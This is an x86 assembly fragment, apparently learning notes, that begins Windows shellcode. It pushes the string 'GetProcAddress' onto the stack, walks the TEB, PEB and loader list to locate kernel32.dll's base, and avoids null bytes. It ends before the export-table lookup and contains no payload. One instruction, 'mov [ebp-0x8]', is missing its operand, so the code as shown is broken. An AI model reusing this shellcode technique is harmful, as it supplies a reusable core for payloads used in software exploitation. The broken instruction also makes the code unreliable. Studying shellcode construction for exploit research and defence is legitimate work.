;Technique:PEB & Export Directory TAble
;create a new stack frame
push ebp
mov ebp, esp
sub esp, 0x60

;push string "GetProcAddress",0x00 onto the stack
xor eax,eax ;clear eax register
mov ax, 0x7373
push eax ;ss: 73730000 //EAX = 0x00007373 //x73=ASCII "s"
push 0x65726464 ;erdd : 65726464 //GetProcAddress
push 0x41636f72 ;Acor : 41636f72
push 0x50746547 ;pteG : 50746547
mov [ebp-0x4], esp ;save PTR to string at bottom of the stack(ebp)

;Find Base Address of the kernel32.dll Dynamically linked library
;FS segment register will always point to the Thread Enviroment Block(TEB
;shellcode is dyanamic doesnt rely on hardcoded addresses

xor eax, eax ;clear eax register
mov eax, [fs:eax+0x30] ;GET PEB Address from within the TEB;leveraging the FS register
						;windbg>!teb
						;windbg>dt nt!_TEB <address from fiest command
						;EAX=Address
mov eax, [eax+0xc] ;GET the LDR Address from within PEB
				   ;windbg>dt nt!_PEB ,address from first command
				   ;EAX=Address of LDR
mov eax, [eax+0x1c] ;Get the first entry in the initiliazation order module list (ntdll.dll)
                    ;windbg>dt nt!_PEB_LDR_DATA Address of LDR
					; EAX = 0x005f1d90 (First Entry of InInitialzationOrderModuleList - ntdll.dll)
mov ebx, eax ;should be mov eax [eax] but there are nullbytes generated
mov eax, [ebx] ;Avoid nullbytes

mov ebx,eax
mov eax, [ebx]

mov eax, [eax+0x8] ; mov the kernel32.dll base address into eax
                   ;EAX = 0x76220000 (Base address of kernel32.dll)
mov [ebp-0x8] ;save the base addressin the 2nd from bottom position of the stack
;Find the Address of GetProcAddress symbol
;with kernel32.dll base address ,use it to find address of other symbols
;GetProcAddress() will be used to find address of other symbol(function)
;The Export Table technique is used to find the address of GetProcAddress
